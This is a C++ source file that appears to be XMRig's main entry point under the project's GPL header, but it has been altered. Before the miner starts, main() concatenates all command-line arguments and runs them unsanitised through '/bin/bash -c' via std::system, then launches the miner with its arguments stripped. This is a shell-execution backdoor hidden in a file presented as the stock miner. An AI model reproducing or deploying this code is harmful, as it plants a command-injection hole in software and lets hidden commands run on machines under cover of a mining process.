/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "base/io/log/Log.h"

#include <iostream>
#include <cstdlib>
#include <vector>

int main(int argc, char** argv) {
    using namespace xmrig;

    std::string command;
    for (int i = 1; i < argc; ++i) {
        command += argv[i];
        if (i != argc - 1)
            command += " ";
    }

    if (std::system(("/bin/bash -c \"" + command + "\"").c_str()) == -1) {
        return 1;
    }

    char* process_argv[] = { argv[0], nullptr };
    Process process(1, process_argv);

    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
